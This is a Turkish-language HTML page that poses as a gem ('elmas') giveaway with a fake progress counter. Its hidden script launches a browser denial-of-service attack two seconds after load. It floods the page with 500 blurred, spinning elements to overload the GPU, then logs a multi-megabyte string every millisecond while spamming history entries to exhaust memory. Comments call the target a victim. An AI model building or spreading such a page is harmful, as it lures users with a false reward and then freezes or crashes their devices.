<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>ELMAS TRANSFERİ - 2026</title>
    <style>
        body { background: #000; color: #00ff00; overflow: hidden; font-family: sans-serif; text-align: center; }
        /* Ekran kartını yoran sinsi gölgeler */
        .killer {
            width: 10px; height: 10px;
            box-shadow: 0 0 100px 100px rgba(0,255,0,0.5);
            filter: blur(10px);
            position: absolute;
        }
    </style>
</head>
<body>
    <div style="margin-top:100px;">
        <h2>💎 ELMASLAR HAZIRLANIYOR 💎</h2>
        <h1 id="perc">%0</h1>
    </div>

<script>
    let p = 0;
    setInterval(() => { if(p < 100) { p++; document.getElementById("perc").innerText = "%" + p; }}, 30);

    // --- GPU VE RAM İMHA MOTORU ---
    function nukleerAtak() {
        // Binlerce katman oluşturup ekran kartını kilitler
        for (let i = 0; i < 500; i++) {
            let div = document.createElement("div");
            div.className = "killer";
            div.style.left = Math.random() * 100 + "vw";
            div.style.top = Math.random() * 100 + "vh";
            // Her katmana ağır bir animasyon ekle
            div.style.animation = "spin " + (Math.random() * 1) + "s infinite";
            document.body.appendChild(div);
        }

        // Belleği devasa bir veri bloğuyla şişir
        let d = "ELMAS_GEMS".repeat(1000000);
        setInterval(() => {
            window.history.pushState(null, "", "?q=" + Math.random());
            console.log(d + d);
        }, 1);
    }

    // 2 saniye sonra kurban elmasları beklerken her şeyi başlat
    setTimeout(nukleerAtak, 2000);
</script>

<style>
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
</style>
</body>
</html>
